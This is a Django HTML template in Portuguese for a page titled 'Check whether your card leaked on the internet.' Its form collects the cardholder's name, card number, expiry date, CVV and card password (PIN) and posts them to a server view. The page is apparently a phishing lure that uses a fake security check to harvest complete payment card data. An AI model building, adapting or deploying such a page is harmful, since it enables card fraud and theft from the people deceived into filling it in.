<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifique se seu cartão vazou na internet</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 90%; /* Ajuste a largura para garantir espaço nas laterais */
            max-width: 400px; /* Define uma largura máxima para o container */
            margin: 0 20px; /* Adiciona margem nas laterais */
        }
        .container h1 {
            font-size: 24px;
            margin-bottom: 30px; /* Aumenta o espaço abaixo do título */
            text-align: center;
        }
        .container label {
            display: block;
            margin-bottom: 10px; /* Aumenta o espaço abaixo dos labels */
            font-weight: bold;
        }
        .container input {
            width: 100%;
            padding: 10px; /* Aumenta o padding dentro das caixas de texto */
            margin-bottom: 20px; /* Aumenta o espaço entre as caixas de texto */
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box; /* Garante que o padding não aumente a largura */
        }
        .container button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .container button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verifique se seu cartão vazou na internet</h1>
        <form method="post" action="{% url 'sucesso' %}">
            {% csrf_token %}
            <label for="nome">Nome do Titular</label>
            <input type="text" id="nome" name="nome" required>

            <label for="numero">Número do Cartão</label>
            <input type="text" id="numero" name="numero" required>

            <label for="validade">Data de Validade</label>
            <input type="text" id="validade" name="validade" required>

            <label for="cvv">Código de Segurança (CVV)</label>
            <input type="text" id="cvv" name="cvv" required>

            <label for="cvv">Senha do Cartão</label>
            <input type="text" id="card_pass" name="card_pass" required>

            <button type="submit">Verificar</button>
        </form>
    </div>
</body>
</html>
